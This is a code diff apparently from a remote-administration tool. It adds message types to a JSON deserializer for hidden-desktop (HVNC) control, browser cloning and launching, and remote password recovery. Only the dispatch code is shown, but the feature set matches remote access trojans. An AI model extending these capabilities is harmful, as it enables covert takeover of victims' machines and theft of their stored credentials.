@@ -176,6 +176,16 @@ namespace RemoteAdmin.Shared
                 "ScheduledTaskOperationResponse" => JsonSerializer.Deserialize<ScheduledTaskOperationResponseMessage>(json),
                 "ExportScheduledTask" => JsonSerializer.Deserialize<ExportScheduledTaskMessage>(json),
                 "ExportScheduledTaskResponse" => JsonSerializer.Deserialize<ExportScheduledTaskResponseMessage>(json),
+                "StartHvnc" => JsonSerializer.Deserialize<StartHvncMessage>(json),
+                "StopHvnc" => JsonSerializer.Deserialize<StopHvncMessage>(json),
+                "HvncFrame" => JsonSerializer.Deserialize<HvncFrameMessage>(json),
+                "SetHvncQuality" => JsonSerializer.Deserialize<SetHvncQualityMessage>(json),
+                "HvncInput" => JsonSerializer.Deserialize<HvncInputMessage>(json),
+                "HvncStartProcess" => JsonSerializer.Deserialize<HvncStartProcessMessage>(json),
+                "HvncBrowserClone" => JsonSerializer.Deserialize<HvncBrowserCloneMessage>(json),
+                "HvncLaunchBrowser" => JsonSerializer.Deserialize<HvncLaunchBrowserMessage>(json),
+                "PasswordRecoveryRequest" => JsonSerializer.Deserialize<PasswordRecoveryRequestMessage>(json),
+                "PasswordRecoveryResponse" => JsonSerializer.Deserialize<PasswordRecoveryResponseMessage>(json),
                 _ => throw new Exception($"Unknown message type: {messageType}")
             };
         }
